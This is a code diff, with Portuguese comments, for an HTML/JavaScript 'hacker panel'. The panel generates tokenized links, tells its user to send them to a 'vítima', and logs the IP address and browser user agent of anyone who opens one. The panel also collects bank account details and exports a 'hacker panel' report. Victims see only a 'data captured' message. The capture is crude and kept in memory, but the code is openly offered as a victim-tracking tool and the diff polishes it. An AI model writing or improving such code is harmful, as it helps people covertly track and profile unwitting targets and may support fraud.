@@ -179,10 +179,10 @@ body {
 <body>
 
 <script>
-// Dados para captura
-const captureData = {}; // token -> { ips: [], userAgents: [] }
+// Dados para captura: token -> { ips: [], userAgents: [] }
+const captureData = {};
 
-// Função para mostrar mensagem de cópia e depois "vitima conectada"
+// Copiar link e mostrar notificações
 function copyLinkAndNotify(link) {
   navigator.clipboard.writeText(link).then(() => {
     alert('Link copiado! Envie para sua vítima.');
@@ -194,7 +194,7 @@ function copyLinkAndNotify(link) {
   });
 }
 
-// Detecta token na URL - para captura sem mostrar app
+// Detecta token na URL - se vítima, mostra só mensagem e não carrega app
 window.addEventListener('load', () => {
   const urlParams = new URLSearchParams(window.location.search);
   const token = urlParams.get('token');
@@ -204,33 +204,30 @@ window.addEventListener('load', () => {
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
       .then(data => {
-        // Guarda os dados localmente no objeto (simulação)
         if (!captureData[token]) captureData[token] = { ips: [], userAgents: [] };
         captureData[token].ips.push(data.ip);
         captureData[token].userAgents.push(navigator.userAgent);
 
-        // Exibe mensagem simples, nada do painel
+        // Substitui TODO conteúdo por mensagem simples, sem login nem painel
         document.body.innerHTML = `
-          <h2>Dados capturados com sucesso!</h2>
-          <p>Obrigado por acessar.</p>
+          <div style="display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;color:#00ff99;font-family: monospace;background:#000">
+            <h2>Dados capturados com sucesso!</h2>
+            <p>Obrigado por acessar.</p>
+          </div>
         `;
       })
       .catch(() => {
-        document.body.innerHTML = `<p>Erro ao capturar dados.</p>`;
+        document.body.innerHTML = `<p style="color:#f00; font-family: monospace;">Erro ao capturar dados.</p>`;
       });
-    return; // Para rodar só essa parte
+    return; // para não executar o app normal
   }
 
-  // Se não for vítima, inicia app normalmente
+  // Se não for vítima, inicia o app normal
   initApp();
 });
 
+// Inicializa o app (login, registro, painel)
 function initApp() {
-  // Exibir containers, configurar abas etc.
-  const loginContainer = document.getElementById('loginContainer');
-  const registerContainer = document.getElementById('registerContainer');
-  const dashboardContainer = document.getElementById('dashboardContainer');
-
   // Tabs
   const tabs = document.querySelectorAll('.tab');
   const tabContents = document.querySelectorAll('.tab-content');
@@ -245,14 +242,14 @@ function initApp() {
     });
   });
 
-  // Login / Registro funções
+  // Login / Registro
   window.showRegister = function() {
-    loginContainer.classList.add('hidden');
-    registerContainer.classList.remove('hidden');
+    document.getElementById('loginContainer').classList.add('hidden');
+    document.getElementById('registerContainer').classList.remove('hidden');
   }
   window.showLogin = function() {
-    registerContainer.classList.add('hidden');
-    loginContainer.classList.remove('hidden');
+    document.getElementById('registerContainer').classList.add('hidden');
+    document.getElementById('loginContainer').classList.remove('hidden');
   }
   window.register = function() {
     const user = document.getElementById('regUser').value.trim();
@@ -270,14 +267,14 @@ function initApp() {
     const user = document.getElementById('loginUser').value.trim();
     const pass = document.getElementById('loginPass').value.trim();
     if(user === localStorage.getItem('user') && pass === localStorage.getItem('pass')) {
-      loginContainer.classList.add('hidden');
-      dashboardContainer.classList.remove('hidden');
+      document.getElementById('loginContainer').classList.add('hidden');
+      document.getElementById('dashboardContainer').classList.remove('hidden');
     } else {
       alert('Usuário ou senha inválidos!');
     }
   }
   window.logout = function() {
-    dashboardContainer.classList.add('hidden');
+    document.getElementById('dashboardContainer').classList.add('hidden');
     showLogin();
     clearData();
   }
@@ -300,19 +297,18 @@ function initApp() {
     }
   }
 
-  // Gerar link com token e copiar
+  // Gerar link único e adicionar ao painel
   window.generateLink = function() {
     const token = Math.random().toString(36).substring(2, 10);
     const link = `${location.origin}${location.pathname}?token=${token}`;
-    // Cria dado inicial no captureData
+
     captureData[token] = { ips: [], userAgents: [] };
 
-    // Mostra o link no painel
     const container = document.getElementById('linksList');
     const div = document.createElement('div');
     div.innerHTML = `
       <strong>Link:</strong> <a href="${link}" target="_blank">${link}</a><br>
-      <button onclick="copyLinkAndNotify('${link}')">Copiar Link e Enviar</button>
+      <button onclick="copyLinkAndNotify('${link}')">Compartilhar Link</button>
       <button onclick="showCapturedData('${token}')">Mostrar Dados Capturados</button>
       <div id="data-${token}" style="margin-top: 5px; font-size: 0.9rem;"></div>
       <hr>
@@ -420,19 +416,19 @@ function initApp() {
     doc.save('relatorio_painel_hacker.pdf');
   }
 
-  // Limpar dados do painel
+  // Limpar dados do painel (usado no logout)
   window.clearData = function() {
     document.getElementById('accountsList').innerHTML = '';
     document.getElementById('linksList').innerHTML = '';
     document.getElementById('accountBank').value = '';
     document.getElementById('accountNumber').value = '';
     document.getElementById('accountHolder').value = '';
-    // Limpa dados capturados
     for (const key in captureData) delete captureData[key];
   }
 }
 </script>
 
+<!-- HTML do painel/login/registro (escondido para vítima com token) -->
 <div class="container" id="loginContainer">
   <h2>Login</h2>
   <input type="text" id="loginUser" placeholder="Usuário" autocomplete="username" />
